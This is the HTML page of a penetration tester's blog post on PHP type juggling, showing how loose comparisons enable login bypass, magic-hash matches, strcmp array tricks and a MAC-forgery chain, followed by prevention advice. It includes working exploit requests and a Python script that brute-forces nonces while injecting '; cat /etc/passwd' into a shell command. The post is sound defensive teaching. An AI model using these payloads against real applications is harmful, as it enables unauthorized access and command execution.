@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Google Analytics 4 -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-MBD49NHJ0B"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-MBD49NHJ0B');
+  </script>
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>PHP Type Juggling: How a Loose Comparison Can Bypass Your Authentication | Filip Kecman</title>
+  <meta name="description" content="PHP's loose comparison operator can silently break your authentication. Learn how type juggling works, why == and === behave differently, and how attackers exploit this to bypass login pages, forge MACs, and escalate to remote code execution." />
+  <meta name="robots" content="index, follow" />
+  <link rel="canonical" href="https://kecman.co/blog/php-type-juggling-authentication-bypass.html" />
+
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://kecman.co/blog/php-type-juggling-authentication-bypass.html" />
+  <meta property="og:title" content="PHP Type Juggling: How a Loose Comparison Can Bypass Your Authentication" />
+  <meta property="og:description" content="PHP's == operator silently converts types before comparing. Attackers use this to bypass authentication, forge MACs, and chain into RCE." />
+  <meta property="og:image" content="https://kecman.co/images/og-image.jpg" />
+  <meta property="article:author" content="Filip Kecman" />
+  <meta property="article:published_time" content="2026-03-03" />
+
+  <meta property="article:section" content="Web Security" />
+  <meta property="article:tag" content="PHP" />
+  <meta property="article:tag" content="Type Juggling" />
+  <meta property="article:tag" content="Authentication Bypass" />
+  <meta property="article:tag" content="Web Security" />
+  <meta property="article:tag" content="Penetration Testing" />
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "PHP Type Juggling: How a Loose Comparison Can Bypass Your Authentication",
+    "author": {
+      "@type": "Person",
+      "name": "Filip Kecman",
+      "url": "https://kecman.co"
+    },
+    "datePublished": "2026-03-03",
+    "description": "PHP's loose comparison operator can silently break your authentication. Learn how type juggling works, why == and === behave differently, and how attackers exploit this to bypass login pages, forge MACs, and escalate to remote code execution.",
+    "publisher": {
+      "@type": "Person",
+      "name": "Filip Kecman"
+    },
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https://kecman.co/blog/php-type-juggling-authentication-bypass.html"
+    },
+    "keywords": ["PHP type juggling", "loose comparison", "authentication bypass", "magic hashes", "strict comparison", "PHP security", "penetration testing", "web application security"]
+  }
+  </script>
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [
+      { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://kecman.co/" },
+      { "@type": "ListItem", "position": 2, "name": "Blog", "item": "https://kecman.co/blog.html" },
+      { "@type": "ListItem", "position": 3, "name": "PHP Type Juggling: Authentication Bypass" }
+    ]
+  }
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+  <link rel="icon" href="../favicon.ico" type="image/x-icon" />
+</head>
+<body>
+
+  <!-- NAV -->
+  <nav class="navbar" role="navigation" aria-label="Main navigation">
+    <div class="container">
+      <a href="../index.html" class="nav-logo">Filip Kecman</a>
+      <div class="nav-links" id="navLinks">
+        <a href="../index.html#about">About</a>
+        <a href="../index.html#approach">Approach</a>
+        <a href="../index.html#certifications">Certs</a>
+        <a href="../index.html#experience">Experience</a>
+        <a href="../index.html#thefreesecurity">TFS</a>
+        <a href="../blog.html" class="active">Blog</a>
+        <a href="../index.html#contact" class="nav-cta">Contact</a>
+      </div>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- BLOG POST -->
+  <article class="blog-post-page">
+    <div class="container">
+      <div class="blog-post-header">
+        <a href="../blog.html" style="font-size:.85rem; color:var(--text-muted); margin-bottom:24px; display:inline-block;">&larr; Back to Blog</a>
+        <h1>PHP Type Juggling: How a Loose Comparison Can Bypass Your Authentication</h1>
+        <div class="blog-meta">
+          <span class="blog-tag">Web Security</span>
+          <span>March 3, 2026</span>
+          <span>10 min read</span>
+        </div>
+      </div>
+
+      <div class="blog-post-body">
+        <p>
+          During a penetration test last year, I was looking at a PHP application's login endpoint. The password check was straightforward: hash the user input, compare it against the stored hash, grant access if they match. Standard stuff. Except the developer used <code>==</code> instead of <code>===</code>. Two characters of difference. That one missing equals sign gave me full admin access to the application without knowing a single password.
+        </p>
+        <p>
+          PHP type juggling is one of those vulnerabilities that looks almost too simple to be real. But I've found it on production applications more than once, and it consistently leads to critical findings. It's worth understanding deeply, whether you're a developer trying to avoid it or a security professional looking for it.
+        </p>
+
+        <h2>What Is Type Juggling?</h2>
+        <p>
+          PHP is a loosely typed language. You don't declare variable types explicitly, and PHP will silently convert values between types when it thinks it needs to. This automatic conversion is called <a href="https://www.php.net/manual/en/language.types.type-juggling.php" target="_blank" rel="noopener">type juggling</a>, and it kicks in during comparisons, arithmetic operations, and function calls.
+        </p>
+        <p>
+          The critical distinction is between PHP's two comparison operators:
+        </p>
+        <ul>
+          <li><code>==</code> (loose comparison): compares values <strong>after</strong> type juggling</li>
+          <li><code>===</code> (strict comparison): compares values <strong>and</strong> their data types</li>
+        </ul>
+        <p>
+          Here's a simple example:
+        </p>
+<pre><code>$quantity = 7;
+$input = "7";
+
+// loose: PHP converts $input to integer 7, then compares
+var_dump($quantity == $input);   // bool(true)
+
+// strict: integer vs string, different types
+var_dump($quantity === $input);  // bool(false)</code></pre>
+        <p>
+          So far this seems reasonable. The problem is that PHP's type conversion rules go far beyond simple string-to-integer casting, and the results can be genuinely surprising.
+        </p>
+
+        <h2>Where It Gets Dangerous</h2>
+        <p>
+          PHP's <a href="https://www.php.net/manual/en/language.operators.comparison.php#language.operators.comparison.types" target="_blank" rel="noopener">comparison rules</a> follow a specific hierarchy depending on the types of the two operands:
+        </p>
+        <ul>
+          <li>If either side is a <code>bool</code>, both sides are converted to <code>bool</code></li>
+          <li>If one side is an <code>int</code> and the other a <code>string</code>, the string is converted to an <code>int</code></li>
+          <li>If both sides are numeric-looking strings, they're compared as numbers</li>
+          <li><code>null</code> is converted to an empty string <code>""</code> when compared with a string</li>
+        </ul>
+        <p>
+          This produces some results that will make you question everything:
+        </p>
+<pre><code>// String to integer conversion truncates at first non-numeric char
+var_dump(5 == "5 apples");       // bool(true)
+
+// null becomes empty string
+var_dump(null == "");             // bool(true)
+
+// Before PHP 8.0: any non-numeric string becomes 0
+var_dump(0 == "admin");           // bool(true) in PHP &lt; 8.0
+
+// Scientific notation: both resolve to 0
+var_dump("000" == "0e99999");     // bool(true)</code></pre>
+        <p>
+          That last one is particularly important. PHP recognizes the <code>0e</code> prefix as <a href="https://www.php.net/manual/en/language.types.float.php" target="_blank" rel="noopener">scientific notation</a>. The string <code>"0e99999"</code> is interpreted as $0 \times 10^{99999} = 0$. If both strings in a comparison look like valid numbers, PHP compares them numerically. So <code>"000"</code> (which is $0$) equals <code>"0e99999"</code> (which is also $0$).
+        </p>
+        <p>
+          For an attacker, this is gold.
+        </p>
+
+        <h2>Exploiting Authentication: The Direct Approach</h2>
+        <p>
+          Consider a PHP application that accepts login credentials as JSON and checks the password with a loose comparison:
+        </p>
+<pre><code>$json = file_get_contents('php://input');
+$credentials = json_decode($json, true);
+
+if (isset($credentials['user']) && isset($credentials['pass'])) {
+    $account = fetch_account($credentials['user']);
+
+    if ($account && $credentials['pass'] == $account['pass']) {
+        $_SESSION['authenticated'] = true;
+        $_SESSION['user'] = $credentials['user'];
+        echo json_encode(["status" => "success"]);
+        exit;
+    }
+}</code></pre>
+        <p>
+          The issue is on the line where the password is compared. Because the application accepts JSON input, an attacker is not limited to sending strings. JSON supports integers, booleans, arrays, and null natively. If the stored password is a non-numeric string (which most passwords are), sending the integer <code>0</code> as the password triggers type juggling:
+        </p>
+<pre><code>POST /api/login HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"user": "administrator", "pass": 0}</code></pre>
+        <p>
+          On PHP versions before 8.0, the comparison <code>0 == "S3cur3P@ssw0rd!"</code> evaluates to <code>true</code> because the string is converted to an integer. Since it doesn't start with a digit, it becomes <code>0</code>. Zero equals zero. Authentication bypassed.
+        </p>
+        <p>
+          I want to emphasize: <strong>this is not a theoretical attack.</strong> I've encountered this exact pattern on a real engagement where a PHP API accepted JSON input and used loose comparisons for credential validation. The fix took the developer five minutes. Finding it took me about ten. The impact was full administrative access to the platform.
+        </p>
+
+        <h2>Exploiting Authentication: Magic Hashes</h2>
+        <p>
+          In better-written applications, passwords are hashed before comparison. This should eliminate the direct bypass since both sides of the comparison are hash strings. But type juggling has another trick.
+        </p>
+        <p>
+          Imagine this code:
+        </p>
+<pre><code>$stored_hash = '0e462097431906509019562988736854';
+
+if (isset($_POST['pass']) && is_string($_POST['pass'])) {
+    if (md5($_POST['pass']) == $stored_hash) {
+        // authenticated
+    }
+}</code></pre>
+        <p>
+          The stored MD5 hash starts with <code>0e</code> followed by only digits. PHP treats this as scientific notation equal to zero. If an attacker can find an input whose MD5 hash also matches the <code>0e[0-9]+</code> pattern, both sides evaluate to $0$, and the comparison returns <code>true</code>.
+        </p>
+        <p>
+          These special values are called <strong>magic hashes</strong>. They've been <a href="https://github.com/spaze/hashes" target="_blank" rel="noopener">precomputed for most common hash algorithms</a>. For MD5, the string <code>240610708</code> produces the hash <code>0e462097431906509019562988736854</code>. For SHA-1, the string <code>10932435112</code> produces <code>0e07766915004133176347055865026311692244</code>. Both start with <code>0e</code> followed exclusively by digits.
+        </p>
+        <p>
+          So the attacker doesn't need to know the real password. They just need the stored hash to be in the magic hash format (which happens more often than you'd think with enough users in a database), and then they submit a known magic hash input for that algorithm.
+        </p>
+
+        <h2>The strcmp Trap</h2>
+        <p>
+          Some developers, aware of comparison quirks, reach for <a href="https://www.php.net/manual/en/function.strcmp.php" target="_blank" rel="noopener"><code>strcmp</code></a> instead. The function returns <code>0</code> when two strings are identical, a negative number if the first is less, and a positive number if it's greater. This leads to code like:
+        </p>
+<pre><code>$secret = "xK9#mP2$vL";
+
+if (isset($_POST['token'])) {
+    if (strcmp($_POST['token'], $secret) == 0) {
+        // token validated
+    }
+}</code></pre>
+        <p>
+          The logic seems sound: <code>strcmp</code> returns <code>0</code> only if the strings match. But what happens if the attacker sends an array instead of a string?
+        </p>
+<pre><code>POST /verify HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+token[]=anything</code></pre>
+        <p>
+          On PHP versions before 8.0, <code>strcmp</code> receives an array and a string, can't compare them, and returns <code>null</code>. The comparison becomes <code>null == 0</code>, which evaluates to <code>true</code> after type juggling. Token validated without knowing the secret.
+        </p>
+        <p>
+          PHP 8.0 changed this behavior to throw a <code>TypeError</code>, but a significant number of production applications still run on older versions, and I still encounter this pattern during assessments.
+        </p>
+
+        <h2>Beyond Authentication: MAC Forgery to Command Injection</h2>
+        <p>
+          Type juggling vulnerabilities are not limited to login pages. One of the more interesting exploitation chains I've studied involves using type juggling to forge a Message Authentication Code (MAC), which then enables command injection.
+        </p>
+        <p>
+          Consider an application that lets users browse their home directory. The URL includes a directory path, a nonce, and a MAC that prevents tampering:
+        </p>
+<pre><code>/browse.php?path=/home/user/&nonce=84721&mac=a3f29bc10e</code></pre>
+        <p>
+          The server-side MAC verification looks like this:
+        </p>
+<pre><code>function compute_mac($path, $nonce) {
+    $key = file_get_contents("/secret/mac_key.txt");
+    return substr(hash_hmac('md5', "{$path}||{$nonce}", $key), 0, 10);
+}
+
+function verify_mac($path, $nonce, $mac) {
+    return $mac == compute_mac($path, $nonce);
+}
+
+function list_directory($path) {
+    return shell_exec("ls -la {$path}");
+}</code></pre>
+        <p>
+          There are two vulnerabilities here. First, the <code>$path</code> variable is injected directly into <code>shell_exec</code>, which means command injection is possible if we control that parameter. Second, the MAC verification uses a loose comparison.
+        </p>
+        <p>
+          Normally, we can't exploit the command injection because we don't know the MAC key and can't forge a valid MAC for an arbitrary path. The MAC is 10 hex characters long, meaning $16^{10}$ possible values. Brute-forcing it directly is not practical.
+        </p>
+        <p>
+          But the loose comparison changes the math entirely. If we send <code>mac=0</code> (an integer zero, or the string <code>"0"</code>), and the server computes a MAC that starts with <code>0e</code> followed only by digits, PHP evaluates both as the number $0$. The comparison passes.
+        </p>
+        <p>
+          We can't predict which MAC values the server will compute because we don't have the key. But we can control the <code>nonce</code> parameter, which is included in the MAC computation. So we iterate through nonce values, sending each request with <code>mac=0</code>, until the server happens to compute a MAC in the <code>0e[0-9]+</code> format:
+        </p>
+<pre><code>import requests
+
+url = "http://target.com/browse.php"
+session = {"PHPSESSID": "abc123"}
+
+payload_path = "/home/user/; cat /etc/passwd"
+
+for nonce in range(50000):
+    r = requests.get(url, cookies=session, params={
+        "path": payload_path,
+        "nonce": nonce,
+        "mac": 0
+    })
+
+    if "Invalid MAC" not in r.text:
+        print(f"MAC bypassed with nonce={nonce}")
+        print(r.text)
+        break</code></pre>
+        <p>
+          This doesn't require millions of attempts. The probability of a 10-character hex string matching the <code>0e[0-9]+</code> pattern is roughly 1 in 1,100 (one <code>0e</code> prefix possibility out of $16^2 = 256$, then 8 characters that must be digits: $(10/16)^8 \approx 1/4.3$). In practice, a valid nonce is typically found within a few thousand requests.
+        </p>
+        <p>
+          The result: type juggling in a MAC check escalated to full remote command execution.
+        </p>
+
+        <h2>A Note on JavaScript</h2>
+        <p>
+          PHP is not alone here. JavaScript also has loose (<code>==</code>) and strict (<code>===</code>) comparison operators with its own set of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness" target="_blank" rel="noopener">type coercion rules</a>. However, JavaScript's coercion is less aggressive than PHP's. For example, <code>"0" == "0e1"</code> is <code>false</code> in JavaScript because both operands are strings and no numeric conversion occurs. But <code>0 == "0e1"</code> is <code>true</code> because the string is coerced to a number.
+        </p>
+        <p>
+          JavaScript also has its own quirks: <code>[] == false</code> is <code>true</code>, <code>"" == false</code> is <code>true</code>, and <code>null == undefined</code> is <code>true</code>. While JavaScript type coercion vulnerabilities are less common in server-side code (Node.js applications tend to use strict comparisons more consistently), they do appear in client-side validation logic, which can sometimes be exploited.
+        </p>
+        <p>
+          The general principle applies regardless of language: <strong>never use loose comparisons for security-sensitive operations.</strong>
+        </p>
+
+        <h2>PHP 8.0 Changed Things, But Didn't Fix Everything</h2>
+        <p>
+          PHP 8.0 addressed some of the most egregious type juggling behaviors. Most notably, <code>0 == "non-numeric-string"</code> now evaluates to <code>false</code> instead of <code>true</code>. This eliminates the simplest authentication bypass vector.
+        </p>
+        <p>
+          However, magic hashes still work across all PHP versions because both strings are in valid numeric format. The <code>0e</code> scientific notation comparison hasn't changed. And many applications still run on PHP 7.x, where the full range of type juggling exploits remains available.
+        </p>
+        <p>
+          During penetration tests, one of the first things I check is the PHP version. If it's anything below 8.0 and the application uses loose comparisons anywhere near authentication or authorization logic, there's a good chance I'm finding something.
+        </p>
+
+        <h2>Prevention</h2>
+        <p>
+          The fix is straightforward:
+        </p>
+        <ol>
+          <li><strong>Use strict comparisons everywhere.</strong> Replace every <code>==</code> with <code>===</code> and every <code>!=</code> with <code>!==</code> in security-sensitive code. In practice, there's almost never a legitimate reason to use loose comparisons.</li>
+          <li><strong>Use <code>hash_equals()</code> for hash and token comparisons.</strong> This function performs a timing-safe, strict string comparison. It was specifically designed for comparing hashes and MACs.</li>
+          <li><strong>Use <code>password_hash()</code> and <code>password_verify()</code> for passwords.</strong> These functions handle hashing and comparison safely, eliminating type juggling entirely.</li>
+          <li><strong>Validate and cast input types explicitly.</strong> If you expect a string, enforce it. Don't trust that JSON input or POST data will be the type you assume.</li>
+          <li><strong>Upgrade to PHP 8.0+.</strong> While not a complete fix, it eliminates the most dangerous class of type juggling vulnerabilities.</li>
+        </ol>
+        <p>
+          For the MAC example, replacing the loose comparison with <code>hash_equals()</code> would have completely neutralized the attack:
+        </p>
+<pre><code>function verify_mac($path, $nonce, $mac) {
+    return hash_equals($mac, compute_mac($path, $nonce));
+}</code></pre>
+        <p>
+          One function call. That's the difference between a secure application and remote code execution.
+        </p>
+
+        <h2>The Bottom Line</h2>
+        <p>
+          Type juggling is a class of vulnerability that's easy to overlook during development and easy to find during a penetration test. It doesn't require complex tooling or advanced exploitation techniques. It requires understanding how PHP handles types internally, and recognizing the patterns in source code where a loose comparison intersects with user-controlled input.
+        </p>
+        <p>
+          Every time I review PHP code during an engagement, comparisons are one of the first things I search for. A single <code>==</code> in the wrong place can turn a secure authentication system into one that accepts the integer zero as a valid password.
+        </p>
+        <p>
+          If your application runs on PHP, grep your codebase for loose comparisons in authentication, authorization, and cryptographic verification logic. You might be surprised what you find.
+        </p>
+        <p>
+          Have questions about this or want your PHP application tested? Reach out on <a href="https://www.linkedin.com/in/filip-kecman/" target="_blank" rel="noopener">LinkedIn</a> or through my <a href="../index.html#contact">contact form</a>.
+        </p>
+      </div>
+    </div>
+  </article>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="container">
+      <span class="footer-text">&copy; 2026 Filip Kecman. All rights reserved.</span>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/filip-kecman/" target="_blank" rel="noopener">LinkedIn</a>
+        <a href="https://thefreesecurity.com" target="_blank" rel="noopener">The Free Security</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../js/main.js"></script>
+</body>
+</html>
